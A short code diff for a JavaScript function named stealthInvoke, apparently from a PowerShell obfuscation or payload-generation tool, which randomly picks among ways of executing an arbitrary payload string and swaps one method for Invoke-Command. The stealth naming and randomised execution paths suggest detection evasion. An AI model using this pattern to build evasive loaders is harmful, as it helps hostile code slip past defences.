@@ -340,8 +340,8 @@ function stealthInvoke(payloadExpr) {
     () => `$${pv} = ${payloadExpr}\n[ScriptBlock]::Create($${pv}).Invoke()`,
     // ExecutionContext.InvokeCommand
     () => `$${pv} = ${payloadExpr}\n$ExecutionContext.InvokeCommand.InvokeScript($${pv})`,
-    // PowerShell API
-    () => `$${pv} = ${payloadExpr}\n[PowerShell]::Create().AddScript($${pv}).Invoke()`,
+    // Invoke-Command with ScriptBlock
+    () => `$${pv} = ${payloadExpr}\nInvoke-Command ([ScriptBlock]::Create($${pv}))`,
   ]
   return methods[Math.floor(Math.random() * methods.length)]()
 }
